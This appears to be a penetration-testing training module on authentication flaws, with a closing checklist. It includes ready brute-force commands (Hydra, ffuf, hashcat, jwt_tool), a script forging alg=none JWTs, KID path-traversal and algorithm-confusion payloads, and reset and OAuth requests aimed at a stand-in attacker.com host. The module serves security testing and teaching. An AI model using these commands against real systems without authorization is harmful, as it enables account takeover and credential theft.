# Module: Authentication Testing
## Testing Authentication and Session Management

---

## 2.1 Login Mechanism Analysis

### What to Look For
- Username enumeration via different error messages
- Lack of account lockout / brute force protection
- Weak password policy (min length, complexity)
- Default credentials on admin panels

### Username Enumeration Test
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
```
Compare response for:
- Different HTTP status codes (200 vs 401)
- Different response body text ("Invalid username" vs "Invalid password")
- Different response time (timing oracle)

### Brute Force Test
```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 10 -V

# FFUF
ffuf -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/wordlists/SecLists/Passwords/top-20.txt \
  -mc 302
```

---

## 2.2 Password Reset Flaws

### Host Header Injection
```http
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@target.com
```
Check if reset link is sent to attacker.com domain.

### Predictable Reset Token
- Check if token is sequential, time-based, or short
- Test token reuse after use
- Test token expiration (should expire quickly)

### Response Manipulation
```
# Change server response from:
{"success": false}
# To:
{"success": true}
```
Attempt to manipulate POST body or response to skip verification.

---

## 2.3 Session Management

### Cookie Analysis Checklist
```bash
# Use browser DevTools or Burp to inspect cookies
# Check for:
# - HttpOnly flag (missing = XSS can steal cookie)
# - Secure flag (missing = sent over HTTP)
# - SameSite attribute (missing = CSRF risk)
# - Session expiration
# - Cookie entropy (weak random = guessable)
```

### Session Fixation Test
1. Note your session ID before login
2. Authenticate successfully
3. Check if session ID changed post-login
4. If same → Session Fixation vulnerability

### Session Timeout Test
1. Log in and note session ID
2. Wait 30 minutes without activity
3. Attempt a request with the old session
4. If session still valid → missing timeout

---

## 2.4 JWT Testing

### Decode Token
```bash
# Decode JWT without validation
echo "eyJhbGciOiJIUzI1NiJ9.eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
```

### Algorithm None Attack
```python
# Create token with alg=none
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

### Weak Secret Brute Force
```bash
# hashcat
hashcat -a 0 -m 16500 "eyJhbGci..." /usr/share/wordlists/rockyou.txt

# jwt_tool
python3 jwt_tool.py "eyJhbGci..." -C -d /usr/share/wordlists/rockyou.txt
```

### Algorithm Confusion (RS256 to HS256)
```bash
# jwt_tool
python3 jwt_tool.py "eyJhbGci..." -X k -pk public.pem
```

### KID Injection
```json
{
  "kid": "../../dev/null",
  "alg": "HS256"
}
```

---

## 2.5 OAuth 2.0 Testing

### Key Checks
- Authorization code reuse (should be single-use)
- State parameter present and validated (CSRF protection)
- Open redirect in redirect_uri parameter
- Token leakage in Referer header

### Open Redirect via redirect_uri
```
https://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://attacker.com&
  response_type=code&
  scope=read
```

---

## 2.6 Multi-Factor Authentication (MFA) Bypass

### Common MFA Bypass Techniques
1. **Response manipulation** — Change `"mfa_required": true` to `false`
2. **Direct endpoint access** — Navigate to post-login URL directly
3. **Code reuse** — Try previously used OTP code
4. **Brute force** — 6-digit OTPs have only 1,000,000 combinations
5. **Race condition** — Submit two requests simultaneously

---

## Authentication Testing Checklist

- [ ] Username enumeration
- [ ] Brute force protection (lockout / CAPTCHA / rate limit)
- [ ] Default credentials tested
- [ ] Password reset flaw (host header, token prediction)
- [ ] Session token entropy analysis
- [ ] Session fixation test
- [ ] Session timeout test
- [ ] Cookie security flags (HttpOnly, Secure, SameSite)
- [ ] JWT algorithm:none attack
- [ ] JWT weak secret brute force
- [ ] JWT algorithm confusion (RS256→HS256)
- [ ] OAuth2 state parameter validation
- [ ] OAuth2 redirect_uri open redirect
- [ ] MFA bypass attempts
- [ ] Remember-me token analysis
